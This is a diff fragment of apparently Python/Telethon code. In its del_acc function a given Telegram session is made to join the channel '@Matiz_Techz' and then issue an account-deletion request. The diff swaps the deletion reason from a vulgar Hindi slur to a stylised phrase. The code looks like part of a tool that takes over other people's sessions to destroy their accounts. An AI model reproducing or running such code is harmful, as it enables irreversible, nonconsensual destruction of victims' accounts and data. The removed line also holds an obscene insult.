@@ -360,7 +360,7 @@ async def del_acc(session):
                 await steve(join("@Matiz_Techz"))              
             except Exception as e:
                 print(e)
-            await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
+            await steve(ok.account.DeleteAccountRequest("ᴋɪʏᴀ ᴋᴀʀ ʀᴀʜᴀ ʜᴀɪ ʙʜᴀɪ"))
             await steve.disconnect() 
                              
         else:    
